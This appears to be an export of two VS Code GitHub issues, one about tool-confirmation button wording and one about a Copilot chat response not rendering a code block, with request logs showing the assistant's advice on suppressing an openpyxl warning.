{"repo": "microsoft/vscode", "issue_number": 263257, "issue_url": "https://github.com/microsoft/vscode/issues/263257", "issue_title": "Change \"Continue\" to \"Allow\" for all tool confirmations", "issue_author": "Tyriar", "issue_body": "<img width=\"309\" height=\"125\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/02a247fb-cb05-41dd-9e9e-1c3cf798b1ff\" />\n\n<img width=\"389\" height=\"129\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/457fc470-9b82-46e4-9433-629e835dad14\" />\n\n<img width=\"507\" height=\"229\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/0413531a-7b13-48b5-b8ca-24bb53d493f4\" />", "issue_labels": ["bug", "verified", "insiders-released", "chat-tools"], "comments": []}
{"repo": "microsoft/vscode", "issue_number": 269351, "issue_url": "https://github.com/microsoft/vscode/issues/269351", "issue_title": "Chat response doesn't show code block", "issue_author": "guilhermearaujo", "issue_body": "\nType: <b>Bug</b>\n\nThe AI response suggests me to include a piece of code to my script, but it doesn't show that code. It only refers to it. I expected it to show a code block, but it doesn't.\n\nI tried with sonnet-3.5 and gpt-4.1, and both had this issue\n\nExtension version: 0.31.3\nVS Code version: Code 1.104.2 (e3a5acfb517a443235981655413d566533107e92, 2025-09-24T11:21:37.073Z)\nOS version: Darwin arm64 25.0.0\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|Apple M2 Pro (10 x 2400)|\n|GPU Status|2d_canvas: enabled<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: enabled_on<br>trees_in_viz: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|2, 2, 3|\n|Memory (System)|16.00GB (0.16GB free)|\n|Process Argv||\n|Screen Reader|no|\n|VM|0%|\n</details>\n<!-- generated by issue reporter -->\n\n<img width=\"394\" height=\"640\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/3e28e171-a334-4038-8d09-29aea1687571\" />", "issue_labels": ["bug"], "comments": [{"author": "roblourens", "body": "A log of the request may help https://github.com/microsoft/vscode/wiki/Copilot-Issues#language-model-requests-and-responses"}, {"author": "guilhermearaujo", "body": "Here's the `panel/vscode` logs. I've redacted some information (file paths and jupyter notebook contents)\n\n<details>\n<summary>dfe4a86a.copilotmd</summary>\n\n````\n> \ud83d\udea8 Note: This log may contain personal information such as the contents of your files or terminal output. Please review the contents carefully before sharing.\n# panel/vscode - dfe4a86a\n\n## Metadata\n~~~\nrequestType      : ChatCompletions\nmodel            : gpt-4.1\nmaxPromptTokens  : 111616\nmaxResponseTokens: 16384\nlocation         : 1\npostOptions      : {\"temperature\":0.1,\"top_p\":1,\"max_tokens\":16384,\"n\":1,\"stream\":true}\nintent           : undefined\nstartTime        : 2025-10-01T13:45:47.989Z\nendTime          : 2025-10-01T13:45:50.348Z\nduration         : 2359ms\nourRequestId     : 5ca0e59b-e125-42a1-9b6c-aee41031ebc6\nrequestId        : 5ca0e59b-e125-42a1-9b6c-aee41031ebc6\nserverRequestId  : 5ca0e59b-e125-42a1-9b6c-aee41031ebc6\ntimeToFirstToken : 639ms\nusage            : {\"completion_tokens\":147,\"completion_tokens_details\":{\"accepted_prediction_tokens\":0,\"rejected_prediction_tokens\":0},\"prompt_tokens\":7087,\"prompt_tokens_details\":{\"cached_tokens\":2304},\"total_tokens\":7234}\ntools           : [\n    {\n        \"function\": {\n            \"name\": \"get_vscode_api\",\n            \"description\": \"Get comprehensive VS Code API documentation and references for extension development. This tool provides authoritative documentation for VS Code's extensive API surface, including proposed APIs, contribution points, and best practices. Use this tool for understanding complex VS Code API interactions.\\n\\nWhen to use this tool:\\n- User asks about specific VS Code APIs, interfaces, or extension capabilities\\n- Need documentation for VS Code extension contribution points (commands, views, settings, etc.)\\n- Questions about proposed APIs and their usage patterns\\n- Understanding VS Code extension lifecycle, activation events, and packaging\\n- Best practices for VS Code extension development architecture\\n- API examples and code patterns for extension features\\n- Troubleshooting extension-specific issues or API limitations\\n\\nWhen NOT to use this tool:\\n- Creating simple standalone files or scripts unrelated to VS Code extensions\\n- General programming questions not specific to VS Code extension development\\n- Questions about using VS Code as an editor (user-facing features)\\n- Non-extension related development tasks\\n- File creation or editing that doesn't involve VS Code extension APIs\\n\\nCRITICAL usage guidelines:\\n1. Always include specific API names, interfaces, or concepts in your query\\n2. Mention the extension feature you're trying to implement\\n3. Include context about proposed vs stable APIs when relevant\\n4. Reference specific contribution points when asking about extension manifest\\n5. Be specific about the VS Code version or API version when known\\n\\nScope: This tool is for EXTENSION DEVELOPMENT ONLY - building tools that extend VS Code itself, not for general file creation or non-extension programming tasks.\",\n            \"parameters\": {\n                \"type\": \"object\",\n                \"properties\": {\n                    \"query\": {\n                        \"type\": \"string\",\n                        \"description\": \"The query to search vscode documentation for. Should contain all relevant context.\"\n                    }\n                },\n                \"required\": [\n                    \"query\"\n                ]\n            }\n        },\n        \"type\": \"function\"\n    },\n    {\n        \"function\": {\n            \"name\": \"vscode_searchExtensions_internal\",\n            \"description\": \"This is a tool for browsing Visual Studio Code Extensions Marketplace. It allows the model to search for extensions and retrieve detailed information about them. The model should use this tool whenever it needs to discover extensions or resolve information about known ones. To use the tool, the model has to provide the category of the extensions, relevant search keywords, or known extension IDs. Note that search results may include false positives, so reviewing and filtering is recommended.\",\n            \"parameters\": {\n                \"type\": \"object\",\n                \"properties\": {\n                    \"category\": {\n                        \"type\": \"string\",\n                        \"description\": \"The category of extensions to search for\",\n                        \"enum\": [\n                            \"AI\",\n                            \"Azure\",\n                            \"Chat\",\n                            \"Data Science\",\n                            \"Debuggers\",\n                            \"Extension Packs\",\n                            \"Education\",\n                            \"Formatters\",\n                            \"Keymaps\",\n                            \"Language Packs\",\n                            \"Linters\",\n                            \"Machine Learning\",\n                            \"Notebooks\",\n                            \"Programming Languages\",\n                            \"SCM Providers\",\n                            \"Snippets\",\n                            \"Testing\",\n                            \"Themes\",\n                            \"Visualization\",\n                            \"Other\"\n                        ]\n                    },\n                    \"keywords\": {\n                        \"type\": \"array\",\n                        \"items\": {\n                            \"type\": \"string\"\n                        },\n                        \"description\": \"The keywords to search for\"\n                    },\n                    \"ids\": {\n                        \"type\": \"array\",\n                        \"items\": {\n                            \"type\": \"string\"\n                        },\n                        \"description\": \"The ids of the extensions to search for\"\n                    }\n                }\n            }\n        },\n        \"type\": \"function\"\n    }\n]\n~~~\n## Request Messages\n### System\n~~~md\nYou are a Visual Studio Code assistant. Your job is to assist users in using Visual Studio Code by providing knowledge to accomplish their task. This knowledge should focus on settings, commands, keybindings but also includes documentation. \nWhen asked for your name, you must respond with \"GitHub Copilot\".\nFollow the user's requirements carefully & to the letter.\nFollow Microsoft content policies.\nAvoid content that violates copyrights.\nIf you are asked to generate content that is harmful, hateful, racist, sexist, lewd, or violent, only respond with \"Sorry, I can't assist with that.\"\nKeep your answers short and impersonal.\nAdditional Rules\nIf a command or setting references another command or setting, you must respond with both the original and the referenced commands or settings.\nPrefer a setting over a command if the user's request can be achieved by a setting change.\nIf answering with a keybinding, please still include the command bound to the keybinding.\nIf a keybinding contains a backtick you must escape it. For example the keybinding Ctrl + backtick would be written as ``ctrl + ` ``\nIf you believe the context given to you is incorrect or not relevant you may ignore it.\nAlways respond with a numbered list of steps to be taken to achieve the desired outcome if multiple steps are necessary.\nIf an extension might help the user, you may suggest a search query for the extension marketplace. You must also include the command **Search marketplace** (`workbench.extensions.search`) with args set to the suggested query in the commands section at the end of your response. The query can also contain the tags \"@popular\", \"@recommended\", or \"@featured\" to filter the results.\nThe user is working on a Mac machine. Please respond with system specific commands if applicable.\nIf a command or setting is not a valid answer, but it still relates to Visual Studio Code, please still respond.\nIf the question is about release notes, you must also include the command **Show release notes** (`update.showCurrentReleaseNotes`) in the commands section at the end of your response.\nIf the response includes a command, only reference the command description in the description. Do not include the actual command in the description.\nAll responses for settings and commands code blocks must strictly adhere to the template shown below:\n<responseTemplate>\n```json\n{\n\t\"type\": \"array\",\n\t\"items\": {\n\t\"type\": \"object\",\n\t\"properties\": {\n\t  \"type\": {\n\t\t\"type\": \"string\",\n\t\t\"enum\": [\"command\", \"setting\"]\n\t  },\n\t  \"details\": {\n\t\t\"type\": \"object\",\n\t\t\"properties\": {\n\t\t  \"key\": { \"type\": \"string\" },\n\t\t  \"value\": { \"type\": \"string\" }\n\t\t},\n\t\t\"required\": [\"key\"]\n\t  }\n\t},\n\t\"required\": [\"type\", \"details\"],\n\t\"additionalProperties\": false\n\t}\n}\n```\nwhere the `type` is either `setting`, `command`.\n- `setting` is used for responding with a setting to set.\n- `command` is used for responding with a command to execute\nwhere the `details` is an optional object that contains the setting/command objects.\n- `key` is the setting | command value to use .\n- `value` is the setting value in case of a setting.\n- `value` is the optional arguments to the command in case of a command.\n\n</responseTemplate>\n<examples>\nBelow you will find a set of examples of what you should respond with. Please follow these examples as closely as possible.\n<singleSettingExample>\nQuestion: How do I disable telemetry?\nResponse:\nUse the **telemetry.telemetryLevel** setting to disable telemetry.\n```json\n[\n\t{\n\t\t\"type\": \"setting\",\n\t\t\"details\": {\n\t\t\t\"key\": \"telemetry.telemetryLevel\",\n\t\t\t\"value\": \"off\"\n\t\t}\n\t}\n]\n```\n</singleSettingExample>\n<singleCommandExample>\nQuestion: How do I open a specific walkthrough?\nUse the **Welcome: Open Walkthrough...** command to open walkthroughs.\nResponse:\n```json\n[\n\t{\n\t\t\"type\": \"command\",\n\t\t\"details\": {\n\t\t\t\"key\": \"workbench.action.openWalkthrough\",\n\t\t}\n\t}\n]\n```\n</singleCommandExample>\n<multipleSettingsExample>\nIf you are referencing multiple settings, first describe each setting and then include all settings in a single JSON markdown code block, as shown in the template below:\nQuestion: How can I change the font size in all areas of Visual Studio Code, including the editor, terminal?\nResponse:\nThe **editor.fontsize** setting adjusts the font size within the editor.\nThe **terminal.integrated.fontSize** setting changes the font size in the integrated terminal.\nThis **window.zoomLevel** setting controls the zoom level of the entire Visual Studio Code interface.\n```json\n[\n\t{\n\t\t\"type\": \"setting\",\n\t\t\"details\": {\n\t\t\t\"key\": \"editor.fontSize\",\n\t\t\t\"value\": \"18\"\n\t\t}\n\t},\n\t{\n\t\t\"type\": \"setting\",\n\t\t\"details\": {\n\t\t\t\"key\": \"terminal.integrated.fontSize\",\n\t\t\t\"value\": \"14\"\n\t\t}\n\t},\n\t{\n\t\t\"type\": \"setting\",\n\t\t\"details\": {\n\t\t\t\"key\": \"window.zoomLevel\",\n\t\t\t\"value\": \"1\"\n\t\t}\n\t}\n]\n```\n</multipleSettingsExample>\n<multipleCommandsExample>\nIf you are referencing multiple commands, do not combine all the commands into the same JSON markdown code block.\nInstead, describe each command and include the JSON markdown code block in a numbered list, as shown in the template below:\nQuestion: How can I setup a python virtual environment in Visual Studio Code?\nResponse:\nUse the **Python: Create Environment** command to create a new python environment.\n```json\n[\n\t{\n\t\t\"type\": \"command\",\n\t\t\"details\": {\n\t\t\t\"key\": \"python.createEnvironment\"\n\t\t}\n\t}\n]\n```Select the environment type (Venv or Conda) from the list.\nIf creating a Venv environment, select the interpreter to use as a base for the new virtual environment.\nWait for the environment creation process to complete. A notification will show the progress.\nEnsure your new environment is selected by using the **Python: Select Interpreter** command.\n```json\n[\n\t{\n\t\t\"type\": \"command\",\n\t\t\"details\": {\n\t\t\t\"key\": \"python.setInterpreter\"\n\t\t}\n\t}\n]\n```\n</multipleCommandsExample>\n<noSuchCommandExample>\nQuestion: How do I move the terminal to a new window?\nResponse:\nThere is no such command.\n\n</noSuchCommandExample>\n<invalidQuestionExample>\nQuestion: How do I bake a potato?\nResponse:\nSorry this question isn't related to Visual Studio Code.\n\n</invalidQuestionExample>\n<marketplaceSearchExample>\nQuestion: How do I add PHP support?\nResponse:\nYou can use the **Search marketplace** command to search for extensions that add PHP support.\n```json\n[\n\t{\n\t\t\"type\": \"command\",\n\t\t\"details\": {\n\t\t\t\"key\": \"workbench.extensions.search\",\n\t\t\t\"value\": \"php\"\n\t\t}\n\t}\n]\n```\n\n</marketplaceSearchExample>\n\n</examples>\n<extensionSearchResponseRules>\nIf you referene any extensions, you must respond with with the identifiers as a comma seperated string inside ```vscode-extensions code block. \nDo not describe the extension. Simply return the response in the format shown above.\n<extensionResponseExample>\nQuestion: What are some popular python extensions?\nResponse:\nHere are some popular python extensions.\n```vscode-extensions\nms-python.python,ms-python.vscode-pylance\n```\n</extensionResponseExample>\n\n</extensionSearchResponseRules>\n\n~~~\n\n### User\n~~~md\nUse the examples above to help you formulate your response and follow the examples as closely as possible. Below is a list of information we found which might be relevant to the question. For view related commands \"Toggle\" often means Show or Hide. A setting may reference another setting, that will appear as \\`#setting.id#\\`, you must return the referenced setting as well. You may use this context to help you formulate your response, but are not required to.\n<command>\nHere are some possible commands:\n- Notebook: Stop Cell Execution (\"notebook.cell.cancelExecution\") (Keybinding: \"Not set\")\n- Notebook: Focus Out Active Cell Output (\"notebook.cell.focusOutOutput\") (Keybinding: \"\u2303\u2318\u2191\")\n- Notebook: Collapse Cell Output (\"notebook.cell.collapseCellOutput\") (Keybinding: \"\u2318K T\")\n- Notebook: Go to Most Recently Failed Cell (\"notebook.revealLastFailedCell\") (Keybinding: \"Not set\")\n- Notebook: Collapse Cell Input (\"notebook.cell.collapseCellInput\") (Keybinding: \"\u2318K \u2318C\")\n- Notifications: Hide Notifications (\"notifications.hideList\") (Keybinding: \"Escape\")\n- Notebook: Clear Cell Outputs (\"notebook.cell.clearOutputs\") (Keybinding: \"\u2325Delete\")\n- Notebook: Change Cell to Code (\"notebook.cell.changeToCode\") (Keybinding: \"Y\")\n- Notebook: Format Notebook (\"notebook.format\") (Keybinding: \"\u21e7\u2325F\")\n- Notebook: Collapse All Cell Outputs (\"notebook.cell.collapseAllCellOutputs\") (Keybinding: \"Not set\")\n- Notebook: Customize Notebook Layout (\"workbench.notebook.layout.configure\") (Keybinding: \"Not set\")\n- Notebook: Toggle Outputs (\"notebook.cell.toggleOutputs\") (Keybinding: \"O\")\n- Developer: Toggle Notebook Clipboard Troubleshooting (\"workbench.action.toggleNotebookClipboardLog\") (Keybinding: \"Not set\")\n- Notebook: Show Cell Line Numbers (\"notebook.cell.toggleLineNumbers\") (Keybinding: \"L\")\n- View: Clear Output (\"workbench.output.action.clearOutput\") (Keybinding: \"Not set\")\n- Notebook: Insert Code Cell Below and Focus Container (\"notebook.cell.insertCodeCellBelowAndFocusContainer\") (Keybinding: \"B\")\n- Notebook: Toggle Scroll Cell Output (\"notebook.cell.toggleOutputScrolling\") (Keybinding: \"\u2318K Y\")\n- Toggle Line Comment (\"editor.action.commentLine\") (Keybinding: \"\u2318/\")\n- Notebook: Clear All Outputs (\"notebook.clearAllCellsOutputs\") (Keybinding: \"Not set\")\n- Developer: Clear Notebook Kernels MRU Cache (\"notebook.clearNotebookKernelsMRUCache\") (Keybinding: \"Not set\")\n- Hide Inline Suggestion (\"editor.action.inlineSuggest.hide\") (Keybinding: \"Escape\")\n- Jupyter: Change Cell to Code (\"jupyter.changeCellToCode\") (Keybinding: \"\u2303; C\")\n- Notebook: Add Cell Output to Chat (\"notebook.cellOutput.addToChat\") (Keybinding: \"Not set\")\n- Test: Toggle Inline Test Output (\"testing.toggleInlineTestOutput\") (Keybinding: \"\u2318; \u2318I\")\n- Developer: Clear Notebook Editor Type Cache (\"notebook.clearNotebookEdtitorTypeCache\") (Keybinding: \"Not set\")\n</command>\n<settings>\nHere are some possible settings:\nSetting Id: git.ignoreLegacyWarning\nType: boolean\nDescription: Ignores the legacy Git warning.\n\nSetting Id: notebook.output.minimalErrorRendering\nType: boolean\nDescription: Control whether to render error output in a minimal style.\n\nSetting Id: notebook.outline.showCodeCells\nType: boolean\nDescription: When enabled, notebook outline shows code cells.\n\nSetting Id: jupyter.interactiveWindow.textEditor.magicCommandsAsComments\nType: boolean\nDescription: Uncomment shell assignments (#!), line magic (#!%) and cell magic (#!%%) when parsing code cells.\n\nSetting Id: jupyter.interactiveWindow.codeLens.debugCommands\nType: string\nDescription: Set of debug commands to put as code lens above a cell while debugging.\n\nSetting Id: notebook.outline.showCodeCellSymbols\nType: boolean\nDescription: When enabled, notebook outline shows code cell symbols. Relies on `#notebook.outline.showCodeCells#` being enabled.\n\nSetting Id: notebook.diff.ignoreOutputs\nType: boolean\nDescription: Hide Outputs Differences\n\nSetting Id: jupyter.interactiveWindow.textEditor.cellFolding\nType: boolean\nDescription: Enable folding regions for code cells in Python files. This setting requires a reload of VS Code.\n\nSetting Id: git.ignoreWindowsGit27Warning\nType: boolean\nDescription: Ignores the warning when Git 2.25 - 2.26 is installed on Windows.\n\nSetting Id: accessibility.verbosity.terminal\nType: boolean\nDescription: Provide information about how to access the terminal accessibility help menu when the terminal is focused.\n\nSetting Id: interactiveWindow.collapseCellInputCode\nType: string\nDescription: Controls whether code cells in the interactive window are collapsed by default.\nPossible values:\n - always - \n - never - \n - fromEditor - \n\nSetting Id: git.ignoreLimitWarning\nType: boolean\nDescription: Ignores the warning when there are too many changes in a repository.\n\nSetting Id: npm.runSilent\nType: boolean\nDescription: Run npm commands with the `--silent` option.\n\nSetting Id: notebook.breadcrumbs.showCodeCells\nType: boolean\nDescription: When enabled, notebook breadcrumbs contain code cells.\n\nSetting Id: html.format.enable\nType: boolean\nDescription: Enable/disable default HTML formatter.\n\nSetting Id: notebook.defaultFormatter\nType: string,null\nDescription: Defines a default notebook formatter which takes precedence over all other formatter settings. Must be the identifier of an extension contributing a formatter.\nPossible values:\n - null - \n - aaron-bond.better-comments - \n - ms-python.black-formatter - \n - Boto3typed.boto3-ide - \n - GitHub.copilot - \n - GitHub.copilot-chat - \n - vscode.css-language-features - \n - tamasfe.even-better-toml - \n - codezombiech.gitignore - \n - golang.go - \n - vscode.html-language-features - \n - ms-python.isort - \n - vscode.json-language-features - \n - ms-vscode.makefile-tools - \n - yzhang.markdown-all-in-one - \n - vscode.markdown-language-features - \n - vscode.markdown-math - \n - vscode.php-language-features - \n - inferrinizzard.prettier-sql-vscode - \n - esbenp.prettier-vscode - \n - ms-python.python - \n - mechatroner.rainbow-csv - \n - ms-vscode-remote.remote-ssh-edit - \n - LoranKloeze.ruby-rubocop-revived - \n - jock.svg - \n - vscode.typescript-language-features - \n - ms-azuretools.vscode-containers - \n - dbaeumer.vscode-eslint - \n - mgmcdermott.vscode-language-babel - \n - ms-python.vscode-pylance - \n - wmaurer.change-case - \n - vscode.configuration-editing - \n - vscode.debug-auto-launch - \n - vscode.debug-server-ready - \n - ms-python.debugpy - \n - jianbingfang.dupchecker - \n - EditorConfig.EditorConfig - \n - vscode.emmet - \n - vscode.extension-editing - \n - ChristianAlexander.flip - \n - vscode.git - \n - vscode.git-base - \n - vscode.github - \n - vscode.github-authentication - \n - eamodio.gitlens - \n - vscode.grunt - \n - vscode.gulp - \n - vscode.ipynb - \n - vscode.jake - \n - ms-vscode.js-debug - \n - ms-vscode.js-debug-companion - \n - ms-toolsai.jupyter - \n - ms-toolsai.jupyter-renderers - \n - ms-vscode.live-server - \n - Tyriar.lorem-ipsum - \n - vscode.media-preview - \n - vscode.merge-conflict - \n - vscode.microsoft-authentication - \n - vscode.npm - \n - vscode.references-view - \n - ms-vscode.remote-explorer - \n - ms-vscode.remote-server - \n - ms-vscode-remote.remote-ssh - \n - ms-vscode-remote.remote-wsl - \n - vscode.search-result - \n - vscode.simple-browser - \n - pepri.subtitles-editor - \n - vscode.terminal-suggest - \n - vscode.tunnel-forwarding - \n - bibhasdn.unique-lines - \n - iliazeus.vscode-ansi - \n - sleistner.vscode-fileutils - \n - ms-vscode.vscode-js-profile-table - \n - ms-toolsai.vscode-jupyter-cell-tags - \n - ms-toolsai.vscode-jupyter-slideshow - \n - ms-python.vscode-python-envs - \n\nSetting Id: accessibility.signals.notebookCellFailed\nType: object\nDescription: Plays a signal - sound (audio cue) and/or announcement (alert) - when a notebook cell execution fails.\n\nSetting Id: git.ignoreRebaseWarning\nType: boolean\nDescription: Ignores the warning when it looks like the branch might have been rebased when pulling.\n\nSetting Id: javascript.format.insertSpaceBeforeAndAfterBinaryOperators\nType: boolean\nDescription: Defines space handling after a binary operator.\n\nSetting Id: notebook.experimental.generate\nType: boolean\nDescription: Enable experimental generate action to create code cell with inline chat enabled.\n\nSetting Id: eslint.quiet\nType: boolean\nDescription: Turns on quiet mode, which ignores warnings.\n\nSetting Id: editor.unusualLineTerminators\nType: string\nDescription: Remove unusual line terminators that might cause problems.\nPossible values:\n - auto - Unusual line terminators are automatically removed.\n - off - Unusual line terminators are ignored.\n - prompt - Unusual line terminators prompt to be removed.\n\nSetting Id: git.ignoreMissingGitWarning\nType: boolean\nDescription: Ignores the warning when Git is missing.\n\nSetting Id: [html]\nType: object\nDescription: Configure settings to be overridden for html.\n\nSetting Id: javascript.format.enable\nType: boolean\nDescription: Enable/disable default JavaScript formatter.\n\n\n</settings>\n<currentVSCodeVersion>\nCurrent VS Code version (major.minor): 1.104\n</currentVSCodeVersion>\n\n<vscodeAPIToolUseInstructions>\nAlways call the tool get_vscode_api to get documented references and examples when before responding to questions about VS Code Extension Development.\n\n</vscodeAPIToolUseInstructions>\n<searchExtensionToolUseInstructions>\nAlways call the tool 'vscode_searchExtensions_internal' to first search for extensions in the VS Code Marketplace before responding about extensions.\n\n</searchExtensionToolUseInstructions>\n<vscodeCmdToolUseInstructions>\nCall the tool run_vscode_command to run commands in Visual Studio Code, only use as part of a new workspace creation process. \nYou must use the command name as the `name` field and the command ID as the `commandId` field in the tool call input with any arguments for the command in a `map` array.\nFor example, to run the command `workbench.action.openWith`, you would use the following input:\n```\n{\n\t\t\t\t\t\t\"name\": \"workbench.action.openWith\",\n\t\t\t\t\t\t\"commandId\": \"workbench.action.openWith\",\n\t\t\t\t\t\t\"args\": [\"file:///path/to/file.txt\", \"default\"]\n\t\t\t\t\t}\n```\n</vscodeCmdToolUseInstructions>\n\n~~~\n\n### User\n~~~md\n<attachment id=\"file:__redacted_filename__.ipynb\">\nUser's current visible code, this should be the main focus:\nExcerpt from __redacted_filename__.ipynb, lines 35 to 68:\n```json\n// filepath: /Users/__redacted_notebook_path__.ipynb\n__redacted__\n```\n</attachment>\n<attachment>\nUser's active file for additional context:\n// filepath: /Users/__redacted_notebook_path__.ipynb\n{\n    \"cells\": [\n        {\n            \"cell_type\": \"code\",\n            \"id\": \"#VSC-ee9b255e\",\n            \"metadata\": {\n                \"language\": \"python\"\n            },\n            \"source\": [\n                \"__redacted__\"\n            ]\n        },\n        {\n            \"cell_type\": \"code\",\n            \"id\": \"#VSC-b86816a0\",\n            \"metadata\": {\n                \"language\": \"python\"\n            },\n            \"source\": [\n                \"__redacted__\"\n            ]\n        },\n        {\n            \"cell_type\": \"code\",\n            \"id\": \"#VSC-f6ce10d2\",\n            \"metadata\": {\n                \"language\": \"python\"\n            },\n            \"source\": [\n                \"__redacted__\"\n            ]\n        },\n        {\n            \"cell_type\": \"code\",\n            \"id\": \"#VSC-f565312c\",\n            \"metadata\": {\n                \"language\": \"python\"\n            },\n            \"source\": [\n                \"__redacted__\"\n            ]\n        },\n        {\n            \"cell_type\": \"code\",\n            \"id\": \"#VSC-b55d132f\",\n            \"metadata\": {\n                \"language\": \"python\"\n            },\n            \"source\": [\n                \"print(errors)\"\n            ]\n        }\n    ]\n}\n</attachment>\n\n~~~\n\n### User\n~~~md\nwhen I run this notebook cell, I get this warning in the cell output. how can I supress this warning?\n\n.venv/lib/python3.13/site-packages/openpyxl/worksheet/_reader.py:223: UserWarning: Cell G5 is marked as a date but the serial value 20250613120000.0 is outside the limits for dates. The cell will be treated as an error.\n  warn(msg)\n\n~~~\n\n\n\n## Response\n### Assistant\n~~~md\nTo suppress warnings like the one from openpyxl in your notebook cell output, you can use Python's warnings module to filter out UserWarning messages.\n\n1. Add the following code at the top of your notebook (before importing pandas or reading the Excel file):\n\n```python\nimport warnings\nwarnings.filterwarnings(\"ignore\", category=UserWarning)\n```\n\nThis will suppress all UserWarning messages, including those from openpyxl.\n\nIf you want to only suppress warnings from openpyxl, you can specify the module:\n\n```python\nwarnings.filterwarnings(\"ignore\", category=UserWarning, module=\"openpyxl\")\n```\n\nNo Visual Studio Code setting or command is required for this; it's handled in your Python code.\n~~~\n\n\n<style>\n[id^=\"system\"], [id^=\"user\"], [id^=\"assistant\"] {\n\t\tmargin: 4px 0 4px 0;\n}\n\n.markdown-body > pre {\n\t\tpadding: 4px 16px;\n}\n</style>\n````\n</details>\n\nAnd the `vscodePrompt`:\n\n<details>\n<summary>5ce04716.copilotmd</summary>\n\n````\n> \ud83d\udea8 Note: This log may contain personal information such as the contents of your files or terminal output. Please review the contents carefully before sharing.\n# vscodePrompt - 5ce04716\n\n## Metadata\n~~~\nrequestType      : ChatCompletions\nmodel            : gpt-4o-mini\nmaxPromptTokens  : 12285\nmaxResponseTokens: 4096\nlocation         : 1\npostOptions      : {\"temperature\":0,\"top_p\":1,\"max_tokens\":4096,\"n\":1,\"stream\":true}\nintent           : undefined\nstartTime        : 2025-10-01T13:45:46.946Z\nendTime          : 2025-10-01T13:45:47.584Z\nduration         : 638ms\nourRequestId     : a9e701fc-5706-426e-9d23-b6c7011d1c65\nrequestId        : a9e701fc-5706-426e-9d23-b6c7011d1c65\nserverRequestId  : a9e701fc-5706-426e-9d23-b6c7011d1c65\ntimeToFirstToken : 450ms\nusage            : {\"completion_tokens\":21,\"completion_tokens_details\":{\"accepted_prediction_tokens\":0,\"rejected_prediction_tokens\":0},\"prompt_tokens\":860,\"prompt_tokens_details\":{\"cached_tokens\":0},\"total_tokens\":881}\n~~~\n## Request Messages\n### System\n~~~md\nYou are a Visual Studio Code assistant who helps the user create well-formed and unambiguous queries about their Visual Studio Code development environment.\nSpecifically, you help users rewrite questions about how to use Visual Studio Code's Commands and Settings.\nEvaluate the question to determine the user's intent. \nDetermine if the user's question is about the editor, terminal, activity bar, side bar, status bar, panel or other parts of Visual Studio Code's workbench and include those keyword in the rewrite.\nDetermine if the user is asking about Visual Studio Code's Commands and/or Settings and explicitly include those keywords during the rewrite. \nIf the question does not clearly indicate whether it pertains to a command or setting, categorize it as an \u2018Other Question\u2019 \nIf the user is asking about Visual Studio Code Release Notes, respond using this exact protocol and do not rephrase the question: \n- Respond with only one of the following: `release_notes@latest` or `release_notes@last3`.\n- If the user does not specify a timeframe, respond with: `release_notes@latest`.\n- If the request is vague about a timeframe (e.g., \"recent changes\"), respond with: `release_notes@last3` to consider the last three versions (major.minor).\n- If the user asks to find or locate a specific change/feature in the release notes, respond with: `release_notes@last3` to search across the last three versions (major.minor).\nIf the user is asking about Extensions available in Visual Studio Code, simply respond with \"vscode_extensions\"\nIf the user is asking about Visual Studio Code API or Visual Studio Code Extension Development, simply respond with \"vscode_api\"\nRemove any references to \"What\" or \"How\" and instead rewrite the question as a description of the command or setting that the user is trying to find. \nRespond in Markdown. Under a `# Question` header, output a rephrased version of the user's question that resolves all pronouns and ambiguous words like 'this' to the specific nouns they stand for.\nIf it is not clear what the user is asking for or if the question appears to be unrelated to Visual Studio Code, do not try to rephrase the question and simply return the original question. \nDO NOT ask the user for additional information or clarification.\nDO NOT answer the user's question directly.\n\n# Additional Rules\n\n2. If the question contains pronouns such as 'it' or 'that', try to understand what the pronoun refers to by looking at the rest of the question and the conversation history.\n3. If the question contains an ambiguous word such as 'this', try to understand what 'this' refers to by looking at the rest of the question and the conversation history.\n4. After a `# Question` header, output a precise version of the question that resolves all pronouns and ambiguous words like 'this' to the specific nouns they stand for. Be sure to preserve the exact meaning of the question.\n\nExamples\n\nUser: opne cmmand palete\n\nAssistant:\n# Question\nCommand to open command palette\n\n\nUser: How do I change change font size in the editor?\n\nAssistant:\n# Question\nCommand or setting to change the font size in the editor\n\nUser: What is the setting to move editor and pin it\nAssistant: \n# Question\nSettings to move and pin editor\n\nUser: latest released features\n\nAssistant:\nrelease_notes@latest\n\nUser: What are the recent changes?\n\nAssistant:\nrelease_notes@last3\n\nUser: set up python\n\nAssistant:\n# Other Question\nSet up python development in Visual Studio Code\n\nUser: Show me popular extensions\n\nAssistant:\nvscode_extensions\n\nUser: How do I contribute a command to my extension?\n\nAssistant:\nvscode_api\n\n\n~~~\n\n### User\n~~~md\nwhen I run this notebook cell, I get this warning in the cell output. how can I supress this warning?\n\n.venv/lib/python3.13/site-packages/openpyxl/worksheet/_reader.py:223: UserWarning: Cell G5 is marked as a date but the serial value 20250613120000.0 is outside the limits for dates. The cell will be treated as an error.\n  warn(msg)\n\n~~~\n\n\n\n## Response\n### Assistant\n~~~md\n# Question\nCommand or setting to suppress warnings in the output of a notebook cell in Visual Studio Code\n~~~\n\n\n<style>\n[id^=\"system\"], [id^=\"user\"], [id^=\"assistant\"] {\n\t\tmargin: 4px 0 4px 0;\n}\n\n.markdown-body > pre {\n\t\tpadding: 4px 16px;\n}\n</style>\n````\n</details>\n\nI used the Ask feature, but the debug logs don't show any `panel/askAgent` "}, {"author": "jruales", "body": "@guilhermearaujo I see that `dfe4a86a.copilotmd` shared above shows the following as the chat response:\n\n<pre>\nTo suppress warnings like the one from openpyxl in your notebook cell output, you can use Python's warnings module to filter out UserWarning messages.\n\n1. Add the following code at the top of your notebook (before importing pandas or reading the Excel file):\n\n```python\nimport warnings\nwarnings.filterwarnings(\"ignore\", category=UserWarning)\n```\n\nThis will suppress all UserWarning messages, including those from openpyxl.\n\nIf you want to only suppress warnings from openpyxl, you can specify the module:\n\n```python\nwarnings.filterwarnings(\"ignore\", category=UserWarning, module=\"openpyxl\")\n```\n\nNo Visual Studio Code setting or command is required for 